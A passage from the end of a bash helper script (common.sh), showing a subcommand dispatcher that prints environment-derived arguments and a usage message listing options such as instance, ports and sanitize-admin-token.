      [ -n "${2:-}" ] || { printf 'usage: common.sh env-argv <target> <VAR>...\n' >&2; exit 2; }
      dx_env_argv "${@:2}"
      for _a in ${DX_ARGV[@]+"${DX_ARGV[@]}"}; do printf '%s\n' "$_a"; done ;;
    *)
      printf 'usage: common.sh {instance|ports|env|require-local <t>|require-host-scope <t>|resolve-remote <h>|sanitize-admin-token <t>|env-argv <t> <VAR>...}\n' >&2
      exit 2 ;;
  esac
fi
